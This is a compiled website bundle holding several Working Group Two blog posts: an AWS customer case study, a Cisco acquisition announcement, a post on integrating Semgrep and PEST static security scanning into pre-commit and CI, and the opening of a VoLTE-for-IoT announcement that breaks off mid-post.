"use strict";(self.webpackChunkworking_group_two_website=self.webpackChunkworking_group_two_website||[]).push([[1477],{30010:function(e){e.exports=JSON.parse('{"blogPosts":[{"id":"three-group-solutions-opts-for-aws-and-wg2","metadata":{"permalink":"/blog/three-group-solutions-opts-for-aws-and-wg2","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2023-09-15-three-group-solutions-opts-for-wg2-and-csg/index.mdx","source":"@site/../blog/2023-09-15-three-group-solutions-opts-for-wg2-and-csg/index.mdx","title":"Three Group Solutions Drives MVNE Agility, Innovation, and Growth by Opting for SaaS Solutions on AWS","description":"Working Group Two and Cisco","date":"2023-09-15T00:00:00.000Z","formattedDate":"September 15, 2023","tags":[{"label":"mvne","permalink":"/blog/tags/mvne"},{"label":"aws","permalink":"/blog/tags/aws"},{"label":"csg","permalink":"/blog/tags/csg"},{"label":"cloud-native","permalink":"/blog/tags/cloud-native"},{"label":"showcase","permalink":"/blog/tags/showcase"}],"readingTime":5.895,"hasTruncateMarker":true,"authors":[{"name":"Everyone @ wgtwo","title":"\ud83c\udf55","url":"https://www.wgtwo.com","imageURL":"/img/author-photos/wgtwo.png","key":"wgtwo"}],"frontMatter":{"slug":"three-group-solutions-opts-for-aws-and-wg2","title":"Three Group Solutions Drives MVNE Agility, Innovation, and Growth by Opting for SaaS Solutions on AWS","date":"2023-09-15T00:00:00.000Z","tags":["mvne","aws","csg","cloud-native","showcase"],"authors":["wgtwo"],"image":"./three-group-solutions-csg-wg2.png"},"nextItem":{"title":"The simple questions that became a global platform: Cisco has acquired Working Group Two","permalink":"/blog/cisco-intends-to-acquire-wg2"}},"content":"import Image from \\"@theme/IdealImage\\";\\nimport Tooltip from \'../components/tooltip/tooltip\'\\n\\n![Working Group Two and Cisco](three-group-solutions-csg-wg2.png)\\n\\n\\nThree Group Solutions transformed its MVNE platform with a fully cloud-native, complete mobile solution with help from AWS Partners CSG and Working Group Two (WG2). Working with CK Hutchison\u2019s 11 mobile operators across Europe and Asia, the mobile virtual network enabler faced challenges with an aging infrastructure, complex vendor relationships, and prolonged onboarding processes. By adopting CSG Ascendon from CSG as its business support system and WG2 as its mobile core network, Three Group Solutions adopted a modern, cloud-native environment running on Amazon Web Services (AWS). Now, it can onboard customers in 6\u20138 weeks, monetize services, and embrace modern business models with unparalleled agility.\\n\\n\x3c!--truncate--\x3e\\n\\n### Innovating to Meet Customer Needs and Stay Competitive in an Evolving Industry\\n\\nThe telecommunications industry is changing as technologically advanced competitors challenge traditional companies and outdated systems. In this environment,\xa0[Three Group Solutions](https://threegroupsolutions.com/)\xa0sought to meet rapidly changing customer demands and accelerate time to market.\\n\\nRecognizing the need to embrace the cloud and software-as-a-service (SaaS) models, the company turned to AWS Partners. To build a complete, fully cloud-native solution, the company engaged\xa0[CSG](https://www.csgi.com/), an\xa0[AWS Partner](https://partners.amazonaws.com/partners/001E000001eMo9dIAC/CSG)\xa0that specializes in business support systems (BSS), and\xa0[Working Group Two](https://www.wgtwo.com/)\xa0(WG2), an\xa0[AWS Partner](https://partners.amazonaws.com/partners/0010h00001ZY6fDAAT/Working%20Group%20Two%20As)\xa0that delivers a mobile core network platform as a service.  \\n\\n<br />\\n\\n> ### \u201cWith CSG and WG2 solutions on AWS, we can onboard customers in 6\u20138 weeks instead of 9 months.\u201d  \\n> \\n> <small><strong>Tom Gardner</strong></small><br />\\n> <small>Director of Enterprise, Wholesale, and IoT Products, Three Group Solutions</small>\\n\\n<br />\\n\\n### Using Cloud Operating Models to Upgrade an Aging System for Three Group Solutions\\n\\nThree Group Solutions aggregates global mobile network assets owned by its parent company,\xa0[CK Hutchison Holdings Limited](https://www.ckh.com.hk/en/global/home.php)\xa0(CK Hutchison), with wholesale, enterprise, and Internet of Things (IoT) solutions. The company helps CK Hutchison\u2019s mobile operators boost their margins and deliver new solutions, but its aging mobile virtual network enabler (MVNE) environment hindered efforts to grow its wholesale business and improve agility.\\n\\n\u201cImagine having over 30 suppliers, each reaching their end of service at different intervals,\u201d says Duminda Sudusinghe, general manager at Three Group Solutions. \u201cWe were constantly making updates and coordinating with customers and operators. This made the process increasingly unmanageable.\u201d\\n\\nTo maximize the full potential of its networks, Three Group Solutions needed a modern cloud environment. It discovered that with cloud solutions from CSG and WG2, barriers to innovation are lowered. The company could entrust the AWS Partners with infrastructure management and upgrade coordination while it focused on monetizing core offerings, like white-labeled mobile virtual network operator (MVNO) services.  \\n\\n### Harnessing AWS Partner Platforms to Modernize Core Network, BSS, and Online Charging Solutions\\n\\nIn 2019, Three Group Solutions joined forces with CSG and adopted\xa0[CSG Ascendon](https://aws.amazon.com/marketplace/pp/prodview-mmdsbie53qmcc/)\xa0as its BSS to manage billing, payments, customer support, and reporting for its MVNO customers. This cloud-native digital BSS solution is powered by several AWS services, particularly\xa0[AWS Fargate](https://aws.amazon.com/fargate/)\u2014a serverless, pay-as-you-go compute engine.\\n\\nDifferent CSG modules use many other AWS services, such as\xa0[Amazon Relational Database Service](https://aws.amazon.com/rds/)\xa0(Amazon RDS), a collection of managed services that make it simple to set up, operate, and scale databases in the cloud, and\xa0[Amazon MSK](https://aws.amazon.com/msk/), which makes it easy to ingest and process streaming data in real time with fully managed Apache Kafka.\\n\\nBy 2021, the company engaged WG2 to deploy its mobile core network on the cloud, delivering simplicity, improving operational efficiency, and gaining the ability to quickly develop new initiatives to meet market needs. The WG2 core delivers a full set of capabilities and network functions on AWS for subscriber authentication, provisioning, policy control, packet core, voice, and messaging.\\n\\nTogether with these AWS Partners, Three Group Solutions built a complete mobile core network with online charging and BSS in the cloud. This project involved a complete transformation of the company\u2019s cloud architecture and introduced network-as-a-service deployment.\\n\\nIn the cloud, Three Group Solutions gained tools to enhance operational efficiency, optimize resource allocation, and scale on demand. The subscriber migration to the cloud was managed with low service impact, improving existing customers\u2019 confidence in the new solution.\\n\\nThree Group Solutions adopted a multitenant cloud model, which can deliver both the core network and BSS as services, even for multicustomer business-to-business-to-everything operations. It also integrated real-time charging functionalities to run diverse and competitive pricing models at scale. The system supports a wide network spectrum, from 2G to 5G, and delivers voice, data, and messaging services seamlessly to subscribers globally.\\n\\nWith this joint WG2 and CSG solution, Three Group Solutions can navigate varied MVNO business demands. Quarterly updates from CSG Ascendon, coupled with the ability to customize offers, mean that the company can respond to market changes and launch new products faster. This adaptability is enhanced by the continual introduction of new AWS services and WG2\u2019s release strategy, where new capabilities are added on an ongoing basis.\\n\\n\u201cCSG\u2019s BSS SaaS solution on AWS is the future for telecommunications providers transitioning to technology companies, driving innovation through digital marketplaces,\u201d says Sean Casey, senior vice president of product management at CSG.  \\n\\n### Growing Customers by Five Times in 2 Years with a Complete Cloud Network\\n\\nWith the help of CSG and WG2, Three Group Solutions is paving the way for future growth. This innovation at scale, built on robust cloud infrastructure, has transformed the way that it serves clients. \u201cBefore, each new customer needed a unique build from scratch,\u201d says Tom Gardner, director of enterprise, wholesale, and IoT products at Three Group Solutions. \u201cNow, most of the setup is common for everyone, and only the final 20 percent is customized. This new method is more efficient, cheaper, and easier for us and our clients.\u201d\\n\\nBy optimizing operations in the cloud, Three Group Solutions is already seeing results. \u201cWe have reduced third-party vendors by 80 percent and maintained a consistently lean team despite growing by five times in less than 2 years,\u201d says Gardner. \u201cWith CSG and WG2 solutions on AWS, we can onboard customers in 6\u20138 weeks instead of 9 months.\u201d\\n\\nBuilt on the cloud and delivered as a service, Three Group Solutions\u2019 mobile core network facilitates simplicity, cost-efficiency, and a continual evolution of capabilities and features. As a result, it can innovate faster.\\n\\n\u201cA powerful, scalable, secure, and globally consistent infrastructure on AWS is a key driver for growth, lower costs, and new business models in telecommunications,\u201d says Erlend Prestgard, CEO of WG2. \u201cMore than just efficiency gains, it opens up whole new operating and delivery models and prepares the ground for global mobile platforms and marketplaces. Three Group Solutions is at the cutting edge of this development and will benefit from being an early mover.\u201d\\n\\nWith a cloud-native architecture, Three Group Solutions\u2019 business now continually evolves and scales, as does the platform supporting it, with enhanced redundancy and no end of life. The company can support the most intricate partner relationships, which in turn makes it simpler to monetize connectivity at scale and onboard new customers.\\n\\nLooking ahead, Three Group Solutions aims to extend its offerings beyond MVNOs and to its IoT and industrial wireless customers\u2014thus paving the way for continual innovation and enhanced customer service in the ever-evolving telecommunications sector."},{"id":"cisco-intends-to-acquire-wg2","metadata":{"permalink":"/blog/cisco-intends-to-acquire-wg2","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2023-08-10-cisco-intends-to-acquire-wg2/index.mdx","source":"@site/../blog/2023-08-10-cisco-intends-to-acquire-wg2/index.mdx","title":"The simple questions that became a global platform: Cisco has acquired Working Group Two","description":"Working Group Two and Cisco","date":"2023-08-10T00:00:00.000Z","formattedDate":"August 10, 2023","tags":[{"label":"cisco","permalink":"/blog/tags/cisco"},{"label":"acquisition","permalink":"/blog/tags/acquisition"}],"readingTime":4.735,"hasTruncateMarker":true,"authors":[{"name":"Erlend Prestgard","title":"CEO","url":"https://www.linkedin.com/in/erlend-prestgard-ab47101/","imageURL":"/img/author-photos/ep.jpg","key":"erlend-prestgard"},{"name":"Werner Eriksen","title":"CTO","url":"https://www.linkedin.com/in/wernereriksen/","imageURL":"/img/author-photos/we.jpeg","key":"werner-eriksen"}],"frontMatter":{"slug":"cisco-intends-to-acquire-wg2","title":"The simple questions that became a global platform: Cisco has acquired Working Group Two","date":"2023-08-10T00:00:00.000Z","tags":["cisco","acquisition"],"authors":["erlend-prestgard","werner-eriksen"],"image":"./wgtwo-cisco.png"},"prevItem":{"title":"Three Group Solutions Drives MVNE Agility, Innovation, and Growth by Opting for SaaS Solutions on AWS","permalink":"/blog/three-group-solutions-opts-for-aws-and-wg2"},"nextItem":{"title":"Developing secure code with confidence via SAST","permalink":"/blog/sast-static-application-security-testing"}},"content":"import Image from \\"@theme/IdealImage\\";\\nimport Tooltip from \'../components/tooltip/tooltip\'\\n\\n![Working Group Two and Cisco](wgtwo-cisco.png)\\n\\n\\nIt\u2019s a big moment for the entire team here at Working Group Two (WG2) today as we\u2019re embarking on the next stage of our journey. We\u2019ll become part of one of the world\u2019s leading communications technology companies. This brings scalability and credibility to the mission we\'ve been on for the better part of a decade.\\n\\n\x3c!--truncate--\x3e\\n\\n*Update, October 24, 2023: Cisco\'s acquisition of Working Group Two is now complete.*\\n\\nBack in 2013, a small group of software engineers in [Telenor](https://www.telenor.com),a large multinational mobile operator, asked some simple questions. Those questions turned into a big idea that later became WG2. Today, we truly enter the global stage as [Cisco has announced its intent to acquire the company](https://blogs.cisco.com/news/cisco-announces-intent-to-acquire-working-group-two)\\n\\n**The questions asked back in 2013 were simple.** The answers were not. \\n \\n* How can we build mobile products on top of the network that people want? \\n* How can we make the mobile core network programmable and a platform for innovation? \\n \\nAs it turns out, there\u2019s at least one reason why you haven\u2019t seen much product innovation coming out of your telecom operator over the last few decades. To a normal mobile phone user, the network seems simple enough. You surf the web, send a text or call someone. Behind the scenes, a huge, complex, and highly rigid machinery transports our thoughts and ideas across the world. \\n \\nHere\u2019s the way we think about it: This mobile network machinery is not just a beast, it\u2019s also a beauty. Mobile telephony is perhaps the most successful, distributed, and standardized technology the world has ever seen. We don\u2019t think much about it today, but the fact that you can reach your mom on her mobile from anywhere in the world, whenever you want, is truly remarkable. \\n \\n**The big idea behind WG2** was to bring out the beauty in the mobile networks and revitalize the entire industry. We want to make connectivity truly valuable again.\\n \\nFirst, the engineers, led by our CTO Werner Eriksen, set out to try to build a better messaging product on Telenor\u2019s core (a mobile core is the heart and brains of the mobile network, responsible for critical functions like subscriber information, location, authentication and switching tasks). They called their product SMS+ and it allowed people to send messages from their laptops and other screens, much like we\u2019re used to with WhatsApp and Messenger today. \\n \\nHey, that\u2019s neat, users and testers said. \\n \\nWhile building SMS+ they painfully realized that to enable this at scale and make a hundred other product ideas leverage the functionality of the core, they needed to rebuild the core itself. It just takes too much time, effort, and cost to build small products at scale in today\u2019s telco world. \\n \\n**So, the WG2 journey started ten years ago** when the team set out to build better mobile user experiences powered by the network. They rebuilt the mobile core network from the ground up to drive down complexity and facilitate innovation. By leveraging public cloud infrastructure, designing a global mobile core delivered as-a-service and complementing it with APIs and an ecosystem, we have been on a journey to \u201cset it free\u201d. \\n \\nBacked by Telenor Group and [Digital Alpha](https://digitalalpha.net), a fund with a long-standing, strategic Cisco partnership, WG2 spun out as an independent entity from Telenor in 2017. We are grateful to them both for standing by us in this journey. Today, WG2 is a team of 90 dedicated professionals, primarily software engineers, and are represented across Europe, Japan, and the United States. Last year, we helped our customers deliver 527 million SMSs, make 354 million voice calls, and transfer 33 petabytes of data. \\n\\n**The beliefs we held in the beginning still hold true:** To grow and prosper, the telecom industry must strive for simplicity, global scale, and programmability. We must also nurture marketplaces and ecosystems of developers. That\u2019s how we can build global platforms, just like the tech industry at large has done. \\n \\nCisco will build on the as-a-service model to realize benefits for the full mobile industry, having already seen success with IoT and private networks. The as-a-service delivery model allows for consistent deployments, reduced complexity, global scale, programmability, and continuous innovation and security management. By expanding this model to cover the entire spectrum of mobile use cases, Cisco can provide simplified access to our latest innovations while enabling customers to focus resources on their core business and deliver new use cases faster.\\n \\nIn getting to know the Cisco Provider Mobility team we will be working with at Cisco, we have discovered remarkable alignment in core beliefs, vision, and culture. We are incredibly excited about seeing our technology combined and deployed with Cisco\u2019s scale and market presence. \\n \\n**On a personal note:** Building start-ups that deliver critical infrastructure in telecom is a non-trivial pursuit. It is tough going, and only possible to do with highly skilled, committed people that can power through the inevitable ups and downs of such a journey. We are so grateful to the individuals that have been part of this journey with us. You know who you are. \\n\\n![Working Group Two Team](wgtwo-team.jpg)\\n\\n**About Working Group Two**  \\nWorking Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency \u2013 leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Our mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. \\n\\n**Media Contact:**  \\nTor Odland  \\nWorking Group Two  \\n+47 9909 0872  \\ntor(at)wgtwo.com"},{"id":"sast-static-application-security-testing","metadata":{"permalink":"/blog/sast-static-application-security-testing","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2023-08-08-sast/index.md","source":"@site/../blog/2023-08-08-sast/index.md","title":"Developing secure code with confidence via SAST","description":"Our mobile core network enables operators to provide a scalable cloud-native solution with access to the SS7 core. We process voice, data, sms, and connectivity, naturally all very sensitive data.","date":"2023-08-08T00:00:00.000Z","formattedDate":"August 8, 2023","tags":[{"label":"security","permalink":"/blog/tags/security"}],"readingTime":7.255,"hasTruncateMarker":true,"authors":[{"name":"Jonny Griffin","title":"Security Tech Lead","url":"https://www.linkedin.com/in/jonnathangriffin/","imageURL":"/img/author-photos/jg.jpg","key":"jonny-griffin"}],"frontMatter":{"slug":"sast-static-application-security-testing","title":"Developing secure code with confidence via SAST","tags":["security"],"authors":["jonny-griffin"],"image":"./required-prs.png"},"prevItem":{"title":"The simple questions that became a global platform: Cisco has acquired Working Group Two","permalink":"/blog/cisco-intends-to-acquire-wg2"},"nextItem":{"title":"WG2 to deliver voice over 4G (VoLTE) for IoT solutions","permalink":"/blog/wg2-volte-for-iot"}},"content":"Our mobile core network enables operators to provide a scalable cloud-native solution with access to the SS7 core. We process voice, data, sms, and connectivity, naturally all very sensitive data.\xa0\\n\\n> Our goal is to build the most secure mobile core network. And to do so it all starts with our code.\xa0\\n\\n\x3c!--truncate--\x3e\\n\\n## Situation: How to facilitate secure coding\\n\\nOur primary objective is to create the most secure mobile core network. This journey begins by focusing on the quality of our code. We need to be able to identify and prevent misconfigurations and vulnerabilities that may inadvertently find their way into our codebase. Whether it\'s accidentally adding secrets to a repository or improperly sanitizing SQL statements, an effective solution is needed to identify and prevent these issues.\\n\\nTo align with a Secure Software Development Life Cycle (SSDLC), our approach involves shifting security controls to the early stages of development. Static Application Security Testing (SAST) is a vital methodology that analyzes code for security flaws and vulnerabilities. While there are both paid solutions like GitHub code scanning and free alternatives like trivy, semgrep, and kics, the key is to select the solution that best suits our needs, and sometimes more than one solution is necessary.\\n\\n## Task: Developer-friendly + effective security tooling\\n\\nOur task at hand is developing a developer-friendly solution that effectively implements security testing of code. To implement this we can break this into two parts. Part 1 is the \u201cglue\u201d that facilitates the process and the SAST toolchain itself.\\n\\n### Requirements\\n\\nWe aim to implement SAST in a scalable, effective, and cost-friendly manner. Our requirements include:\\n\\n- Supporting multiple languages (Kotlin, Go, Java, Erlang, JavaScript, Terraform, Kubernetes manifests)\\n- Easy local triggering by developers and CI\\n- Configurability to exclude specific directories, false positives, or accepted risks via comments\\n- Speed\\n- Identification of true positive findings\\n- Failing pull requests (PRs) and requiring developer intervention upon failure (for changed files)\\n- Scalability across different Git repositories\\n\\n\\nHaving this set of requirements we naturally explored various solutions. When looking at solutions for implementing SAST effort + reward was always in the back of mind. How can we implement a solution with the least amount of effort and local tooling that provides the reward of securing our code base?\xa0\\n\\nSAST toolchains aside, we needed to first solve the question, of how will we run our security SAST toolchains in our codebase.\\n\\n### Integration of SAST toolchain + CI/CD\\n\\n#### The high effort and a high reward\\n\\nWhile we leverage Bazel for unit and integration tests, adopting SAST within this framework posed certain limitations. Managing toolchains and ensuring the availability of specific binaries proved challenging. Furthermore, Bazel lacked easy access to changed files and seamless integration with open-source tools. While not impossible, this approach seemed to require substantial effort for a high reward.\\n\\n#### The low effort with a high reward\\n\\nPreviously wgtwo has adopted pre-commit, a framework that is native to git, for implementing linting as part of the git commit process. We have various checks such as removing white spacing or format terraform, kotlin, java, etc. This framework seems like a perfect place to explore implementing SAST toolchains as it has insight into changed files via git and supports running binaries and Docker images.\\n\\nWith this new approach in mind, we could integrate \\"pre-commit\\" as the entry point for running our chosen SAST toolchains. Let\'s dive deeper into the evaluation and selection of the ideal SAST toolchains that fulfill our requirements.\\n\\n## Action: SAST Toolchains\\n\\n### Evaluating open-source SAST tools\\n\\nOur evaluation focused on open-source toolchains. Open-source frameworks tend to be more flexible than paid options, and they avoid the overhead of sales interactions. We aimed to ensure compatibility with the \\"pre-commit\\" framework and flexibility to align with our evolving codebase and attack surface.\\n\\n|                                                                                                    |         |        |       |              |              |              |\\n| -------------------------------------------------------------------------------------------------- | ------- | ------ | ----- | ------------ | ------------ | ------------ |\\n| Criteria                                                                                           | Semgrep | PEST   | Gosec | Trivy        | KICS         | Terrascan    |\\n| Supports our languages (kotlin, go, java, Erlang, JavaScript, terraform, k8s manifests)            | \u2705       | Erlang | Go    | Terraform, k8s | Terraform, k8s | Terraform, k8s |\\n| Pre-commit hook already supported                                                                  | \u2705       | \u274c      | \u274c     | \u274c            | \u274c            | \u2705            |\\n| Supports whitelisting and excluding vulnerabilities with accepted risk (excluding rule + function) | \u2705       | \u274c      | \u2705     | \u274c            | \u2705            | \u2705            |\\n| Pre-crafted rules aligned to frameworks (CIS, OWASP)\xa0                                              | \u2705       | \u274c      | \u274c     | \u2705            | \u2705            | \u2705            |\\n| Provides value and false negatives                                                                 | \u2705       | \u2705      | \u2705     | \u2705            | \u2705            | \u2705            |\\n\\n<center><i>Diagram evaluating SAST toolchains</i></center>\\n\\n\\n### SAST winner: `Semgrep` + `PEST`\\n\\nBased on our analysis, Semgrep emerged as the winner. It supported common rule frameworks, including Gosec, and demonstrated compatibility with all languages. Future plans involve exploring the creation of custom rulesets that align with ISO 27001:2022 standards.\\n\\n\\n### Integrating SAST toolchains with pre-commit\\n\\n**Semgrep**  \\nSemgrep supports and manages a [.pre-commit-hook.yaml](https://github.com/returntocorp/semgrep/blob/develop/.pre-commit-hooks.yaml#L6) with two options (binary or docker image). We opted in for using the binary integration as from testing there were some clear speed improvements.\xa0\\n\\n**PEST**  \\nPEST Pre-commit hook <https://github.com/omnicate/pre-commit-erlang-pest>\xa0\\n\\nThis custom hook that we built has some logic to identify if dependencies are available on the host, if not it will default to use a docker image. This is useful for a controlled environment when running this SAST toolchain on CI or on developer machines.\\n\\nHere is our `.pre-commit-config.yaml` that implements our new SAST toolchains.\\n\\n`.pre-commit-config.yaml`\\n```bash\\nrepos:\\n\xa0\xa0- repo: https://github.com/omnicate/pre-commit-erlang-pest\\n\xa0\xa0\xa0\xa0rev: v1.0.4\\n\xa0\xa0\xa0\xa0hooks:\\n\xa0\xa0\xa0\xa0\xa0\xa0- id: pest\\n\xa0\xa0- repo: https://github.com/returntocorp/semgrep\\n\xa0\xa0\xa0\xa0rev: v1.23.0\\n\xa0\xa0\xa0\xa0hooks:\\n\xa0\xa0\xa0\xa0\xa0\xa0- id: semgrep\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0name: \\"SAST:semgrep-ci (exclude findings with commenting) [# nosec]\\"\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0exclude: \\".+test.+$|.+presentations.+$\\"\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0args: [\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--config=p/ci\',\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--metrics=off\',\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--severity=ERROR\', # info, warning, or error\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--exclude-rule=html.security.plaintext-http-link.plaintext-http-link\', # TLS handled by proxy\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--error\', # Exit 1 if there are findings\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0]\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0types_or: [javascript, go, python, java, kotlin, ts, bash, terraform, dockerfile]\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0stages: [manual]\\n\xa0\xa0\xa0\xa0\xa0\xa0- id: semgrep\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0name: \\"SAST:semgrep-owasp-top-10 (exclude findings with commenting) [# nosec]\\"\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0exclude: \\".+test.+$|.+presentations.+$\\"\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0args: [\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--config=p/owasp-top-ten\',\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--metrics=off\',\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--severity=ERROR\', # info, warning, or error\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--exclude-rule=go.lang.security.audit.net.use-tls.use-tls\', # TLS handled by proxy\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--error\' # Exit 1 if there are findings\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0]\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0types_or: [javascript, go, python, java, kotlin, ts, bash, terraform, dockerfile]\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0stages: [manual]\\n\xa0\xa0\xa0\xa0\xa0\xa0- id: semgrep\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0name: \\"SAST:gosec (exclude findings with commenting) [# nosec]\\"\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0exclude: \\".+test.+$|.+presentations.+$\\"\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0args: [\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--config=p/gosec\',\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--metrics=off\',\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--severity=WARNING\', # info, warning, or error (all rules are listed as WARNING for gosec)\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--exclude-rule=go.lang.security.some.semgrep.rule.here\', # low risk\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--error\' # Exit 1 if there are findings\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0]\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0types_or: [go]\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0stages: [manual]\\n\xa0\xa0\xa0\xa0\xa0\xa0- id: semgrep\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0name: \\"SAST:semgrep-xss (exclude findings with commenting) [# nosec]\\"\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0exclude: \\".+test.+$|.+presentations.+$\\"\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0args: [\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--config=p/xss\',\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--metrics=off\',\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--severity=WARNING\', # info, warning, or error\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'--error\', # Exit 1 if there are findings\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0]\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0types_or: [javascript, go, python, java, kotlin, ts]\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0stages: [manual]\\n```\\n\\nSome features in the configuration include:\\n\\n- selection of a configuration ruleset\\n- specifying rule severity to limit false positives\\n- global rule exclusion\\n- file type-based hook execution using `types_or`\\n\\n\\n### Integrating pre-commit with Prow ci\\n\\nOur CI transitioned from Concourse to Prow, offering superior benefits. Another blogpost on this should come in the future. For making this pipeline work effectively and quickly, a custom image with pre-loaded dependencies is used, and the following script triggers pre-commit in a Prow job:\\n\\n```bash\\nfunction run_pre_commit() {\\n  if [[ \\"$JOB_NAME\\" == \\"pre-commit-sast\\" ]]; then\\n    IFS=\',\' read -ra IDS <<< \\"semgrep,pest\\" # update to add new SAST pre-commit hooks\\n    HOOK_STAGE=\\"manual\\"\\n    for ID in \\"${IDS[@]}\\"; do\\n        PRE_COMMIT_COMMAND=\\"pre-commit run $ID --from-ref=HEAD~1 --to-ref=HEAD --hook-stage=$HOOK_STAGE --color=never --show-diff-on-failure\\"\\n        echo \\">>> $PRE_COMMIT_COMMAND\\"\\n        if ! $PRE_COMMIT_COMMAND | tee -a $GH_COMMENT_METADATA; then\\n            echo \\"pre-commit failed to run\\"\\n            clean_and_exit 1\\n        fi\\n    done\\n    return\\n  fi\\n  HOOK_STAGE=\\"commit\\"\\n  PRE_COMMIT_COMMAND=\\"pre-commit run --from-ref=HEAD~1 --to-ref=HEAD --hook-stage=$HOOK_STAGE --color=never --show-diff-on-failure\\"\\n  echo \\">>> $PRE_COMMIT_COMMAND\\"\\n  if ! $PRE_COMMIT_COMMAND | tee -a $GH_COMMENT_METADATA; then\\n    echo \\"pre-commit failed to run\\"\\n    clean_and_exit 1\\n  fi\\n}\\n```\\n\\n### Making the SAST checks required in GitHub\\n\\nFor that final piece of the puzzle we need to enforce the SAST check for future PRs. This can be done by the GitHub admin for the organization and is explained in the [GitHub documentation](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/managing-a-branch-protection-rule).\\n\\nTo ensure SAST checks are mandatory for PRs, GitHub admins for the organization can enforce it. \\n\\n## Result\\n\\n![](required-prs.png)  \\n\\nWe are excited to say we have SAST checks as required checks for our code base. This shifts security to the left and reduces time and complexity for fixing future vulnerabilities. Our rulesets will evolve alongside our codebase and expanding attack surface. This solution is a stepping stone toward a more secure tomorrow, focusing on preventive security measures that empower developers rather than restricting them. By enabling developers, we enable ourselves to build a more secure future."},{"id":"wg2-volte-for-iot","metadata":{"permalink":"/blog/wg2-volte-for-iot","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2023-06-22-wg2-volte-for-iot/index.mdx","source":"@site/../blog/2023-06-22-wg2-volte-for-iot/index.mdx","title":"WG2 to deliver voice over 4G (VoLTE) for IoT solutions","description":"Working Group Two today announced that it has entered into a contract with Telenor Connexion to provide VoLTE (voice over LTE/4G) to their global IoT customer base, delivered as-a-service.","date":"2023-06-22T00:00:00.000Z","formattedDate":"June 22, 2023","tags":[{"label":"volte","permalink":"/blog/tags/volte"},{"label":"iot","permalink":"/blog/tags/iot"},{"label":"voice over 4G","permalink":"/blog/tags/voice-over-4-g"},{"label":"voice over LTE","permalink":"/blog/tags/voice-over-lte"}],"readingTime":2.065,"hasTruncateMarker":true,"authors":[{"name":"Tor Odland","title":"Head of Marketing","url":"https://www.linkedin.com/in/torodland/","imageURL":"/img/author-photos/to.jpg","key":"tor-odland"}],"frontMatter":{"slug":"wg2-volte-for-iot","title":"WG2 to deliver voice over 4G (VoLTE) for IoT solutions","image":"./cars-beach-image.jpg","tags":["volte","iot","voice over 4G","voice over LTE"],"authors":["tor-odland"]},"prevItem":{"title":"Developing secure code with confidence via SAST","permalink":"/blog/sast-static-application-security-testing"},"nextItem":{"title":"The worst message in telecom (you won\'t believe)","permalink":"/blog/the-worst-message-in-telco"}},"content":"import ImgWithCaption from \'../components/imgWithCaption\'\\n\\nWorking Group Two today announced that it has entered into a contract with Telenor Connexion to provide VoLTE (voice over LTE/4G) to their global IoT customer base, delivered as-a-service.\\n\\n\x3c!--truncate--\x3e\\n\\n<ImgWithCaption\\n  caption=\\"Source: Unsplash\\"\\n  